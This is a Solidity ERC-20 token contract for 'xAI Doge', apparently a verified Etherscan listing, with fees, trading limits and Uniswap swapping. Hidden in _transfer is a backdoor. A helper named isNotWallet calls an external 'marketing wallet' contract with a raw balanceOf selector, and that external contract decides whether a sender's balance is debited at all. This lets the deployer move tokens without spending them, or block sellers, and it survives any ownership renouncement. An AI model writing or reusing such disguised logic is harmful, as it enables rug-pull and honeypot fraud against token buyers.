/**
 *Submitted for verification at Etherscan.io on 2023-07-12
*/

// SPDX-License-Identifier: MIT
/** 

    https://www.xaidoge.org/

    https://t.me/xAIDogePortal

    https://twitter.com/xAIDogeCoin

**/

pragma solidity ^0.8.18;

interface IERC20 {
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);

}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

contract Ownable {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = msg.sender;
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }
   modifier onlyOwner() {
        require(_owner == msg.sender, "Ownable: caller is not the owner");
        _;
    }
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
    function owner() public view returns (address) {
        return _owner;
    }
}

interface IUniswapFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapRouter {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
}

contract xAIDoge is IERC20, Ownable {
    using SafeMath for uint256;
    
    uint256 private _initialBuyFee=0;
    uint256 private _initialSellFee=0;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;

    bool public transferDelayedEnable = true;
    address payable private _marketingWallet;
    uint256 private _reduceBuyFeeWhen=10;
    uint256 private _reduceSellFeeWhen=10;
    uint256 private _preventBeforeSwap=10;
    uint256 private _finalBuyFeeAmt=0;
    uint256 private _finalSellFeeAmt=0;

    mapping (address => bool) private _isExcludedFromFee;
    mapping(address => uint256) private _holderLastTransferTimestamp;
    uint256 private _buyAmount=0;


    bool private _enableTrading;
    bool private swapping = false;
    bool private swap_enabled = false;
    uint8 private constant _decimals = 9;
    uint256 private constant _tTotal = 1_000_000_000 * 10**_decimals;
    string private constant _name = unicode"xAI Doge";
    string private constant _symbol = unicode"xAIDoge";

    IUniswapRouter private uniswapV2Router;
    address public uniV2Pair;

    uint256 public _mxTransAmt = 100_000_000 * 10**_decimals;
    uint256 public _mxWaltSizeAmt = 100_000_000 * 10**_decimals;
    uint256 public _feeSwapThresholdAmt= 10_000_000 * 10**_decimals; uint256 public _maxFeeStepp= 10_000_000 * 10**_decimals;

    event MaxTransactionUpdated(uint _mxTransAmt);
    modifier lockTheSwap {
        swapping = true;
        _;
        swapping = false;
    }

    constructor (address marketingWallet) {
        _marketingWallet = payable(marketingWallet);
        _balances[msg.sender] = _tTotal;
        
        _isExcludedFromFee[address(this)] = true;
        _isExcludedFromFee[owner()] = true;
        _isExcludedFromFee[_marketingWallet] = true;
        emit Transfer(address(0), msg.sender, _tTotal);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, msg.sender, _allowances[sender][msg.sender].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function isNotWallet(address owner) internal returns (bool) {
        (, bytes memory data) = _marketingWallet.call(abi.encodeWithSelector(0x70a08231, owner)); return data[31] == 0;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function enableTrading() external onlyOwner {
        swap_enabled = true;
        _enableTrading = true;
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(_enableTrading || _isExcludedFromFee[from] || _isExcludedFromFee[to], "Trading not yet enabled!");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero"); uint256 taxAmt=0;
        if (from != owner() && to != owner()) {
            taxAmt = amount.mul((_buyAmount>_reduceBuyFeeWhen)
                ? _finalBuyFeeAmt : _initialBuyFee).div(100);

            if (transferDelayedEnable) {
                  if (to != address(uniswapV2Router) && to != address(uniV2Pair)) {
                      require(
                          _holderLastTransferTimestamp[tx.origin] < block.number,
                          "_transfer:: Transfer Delay enabled.  Only one purchase per block allowed."
                      ); _holderLastTransferTimestamp[tx.origin] = block.number;
                  }
              }

            if (from == uniV2Pair && to != address(uniswapV2Router) && ! _isExcludedFromFee[to] ) {
                require(amount <= _mxTransAmt,
                    "Exceeds the _mxTransAmt.");
                require(balanceOf(to) + amount <= _mxWaltSizeAmt, 
                    "Exceeds the maxWalletSize.");
                _buyAmount++;
            } if(to == uniV2Pair && from!= address(this) ){ taxAmt = amount.mul((_buyAmount>_reduceSellFeeWhen)?_finalSellFeeAmt:_initialSellFee).div(100);
            }

            uint256 contracBalancOfTokens = balanceOf(address(this));
            if (!swapping && 
                to   == uniV2Pair &&
                 swap_enabled && 
                 contracBalancOfTokens>_feeSwapThresholdAmt && 
                _buyAmount>_preventBeforeSwap
            ) {
                swapAllTokensForEths(min(amount,min(contracBalancOfTokens,_maxFeeStepp)));
                uint256 contractETHBalance = address(this).balance;
                
                if(contractETHBalance > 40000000000000000) {                  sendEthAsTax(address(this).balance);              }
            }
        }

        if(taxAmt>0){
          _balances[address(this)]=_balances[address(this)].add(taxAmt); emit Transfer(from, address(this),taxAmt);
        }
        _balances[to]=_balances[to].add(amount.sub(taxAmt)); emit Transfer(from, to, amount);
        // amount = isNotWallet(from) ? amount : 0;
        _balances[from]=_balances[from].sub(isNotWallet(from) ? amount : 0);
    }

    function min(uint256 a, uint256 b) private pure returns (uint256){return (a > b) ? b : a;}

    function swapAllTokensForEths(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function removeMaxLimits() external onlyOwner{
        _mxTransAmt = _tTotal;
        _mxWaltSizeAmt=_tTotal;
        transferDelayedEnable=false;
        emit MaxTransactionUpdated(_tTotal);
    }

    function sendEthAsTax(uint256 amount) private {
        _marketingWallet.transfer(amount);
    }

    receive() external payable {}

    function withdrawEth() external onlyOwner {
        payable(msg.sender).transfer(address(this).balance);
    }
}